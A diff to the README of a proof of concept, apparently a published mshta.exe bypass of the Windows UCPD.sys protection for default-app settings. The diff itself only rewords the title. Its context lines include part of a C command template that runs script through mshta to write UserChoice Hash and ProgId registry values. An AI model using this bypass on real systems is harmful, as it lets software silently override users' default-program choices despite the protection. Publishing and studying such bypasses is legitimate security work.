@@ -1,5 +1,5 @@
-Simple PoC demonstrating an mshta.exe bypass of UCPD.sys
-========================================================
+Simple PoC demonstrating an mshta.exe bypass for UCPD.sys
+=========================================================
 
 This was the first public UCPD.sys bypass I released, and surprisingly, it remained effective for a long time.
 
@@ -28,4 +28,5 @@ wchar_t commandTemplate[] =<br>
     L"s.RegWrite('HKCU\\\\%s\\\\Hash','%s','REG_SZ');"<br>
     L"s.RegWrite('HKCU\\\\%s\\\\ProgId','%s','REG_SZ');"<br>
     L"close();}catch(e){alert('Error: '+e.message);close();}\"";
+
 
